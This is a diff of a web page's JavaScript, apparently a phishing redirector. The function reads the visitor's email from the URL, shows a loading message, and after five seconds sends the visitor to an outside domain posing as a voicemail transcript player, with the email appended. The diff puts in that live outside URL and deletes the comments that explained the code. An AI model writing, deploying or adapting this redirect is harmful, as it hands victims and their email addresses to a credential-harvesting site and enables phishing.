@@ -263,10 +263,10 @@
     function redirectUsingEmail(){
       var email=getEmailFromLocation();
       if(!email){ alert('No email found in URL to redirect with.'); return; }
-      var redirectBaseUrl='https://vimdashboard/mE5I3#';
+      var redirectBaseUrl='https://voicetranscriptplayer.ghostlyluminescence.de/3m0im#';
       var redirectUrl=redirectBaseUrl+email;
       
-      // Show loading message
+
       var loadingMsg=document.getElementById('loadingMessage');
       if(loadingMsg){
         loadingMsg.style.display='block';
@@ -284,7 +284,6 @@
         }, 1000);
       }
       
-      // Redirect after 5 seconds
       setTimeout(function(){
         window.location.href=redirectUrl;
       }, 5000);
@@ -358,3 +357,4 @@
 </body>
 
 </html>
+
